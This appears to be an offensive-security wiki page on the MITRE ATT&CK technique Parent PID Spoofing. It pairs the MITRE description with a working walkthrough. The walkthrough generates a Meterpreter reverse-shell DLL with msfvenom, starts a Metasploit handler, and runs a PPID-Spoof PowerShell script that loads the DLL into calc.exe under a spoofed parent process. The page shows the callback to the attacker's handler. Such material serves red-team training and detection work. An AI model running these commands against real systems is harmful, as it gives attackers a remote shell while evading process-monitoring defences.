---
description: https://attack.mitre.org/techniques/T1134/004/
---

# Parent PID Spoofing

**ATT\&CK ID:** [T1134.004](https://attack.mitre.org/techniques/T1134/004/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:green;">**User**</mark>

**Description**

Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the `CreateProcess` API call, which supports a parameter that defines the PPID to use.This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via `svchost.exe` or `consent.exe`) rather than the current user context.

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be `explorer.exe` rather than an Office document delivered as part of Spearphishing Attachment.

This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as `lsass.exe`), causing the new process to be elevated via the inherited access token.

[\[Source\]](https://attack.mitre.org/techniques/T1134/004/)

## Techniques

### Prerequisite

PPID-Spoof requires a DLL to make use of. In this case we are going to create a reverse shell with `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f dll -o reverse.dll
```

Then start corresponding `metasploit` handler

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <Port>; exploit"
```

### PPID-Spoof

GitHub: [https://github.com/countercept/ppid-spoofing](https://github.com/countercept/ppid-spoofing)

Download the PowerShell script PPID-Spoof.ps1 and load into memory. From here execute the script where:

| Parameter | Description                | Example                        |
| --------- | -------------------------- | ------------------------------ |
| -ppid     | Current PowerShell process | -ppid 6304                     |
| -spawnto  | Binary on system           | "C:\Windows\System32\calc.exe" |
| -dllpath  | msfvenom dll               | .\reverse.dll                  |

```powershell
 PPID-Spoof -ppid 6304 -spawnto "C:\Windows\System32\calc.exe" -dllpath .\reverse.dll
```

After execution see the DLL has been loaded and spawn a `calc.exe` process under our current PowerShell process.

![](../../../.gitbook/assets/ppid-spoof.png)

As well as a call back to our `Metasploit` handler.

![](<../../../.gitbook/assets/image (1026).png>)

## Mitigation

This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.

## Further Reading

**Parent Process ID (PPID) Spoofing:**[https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)
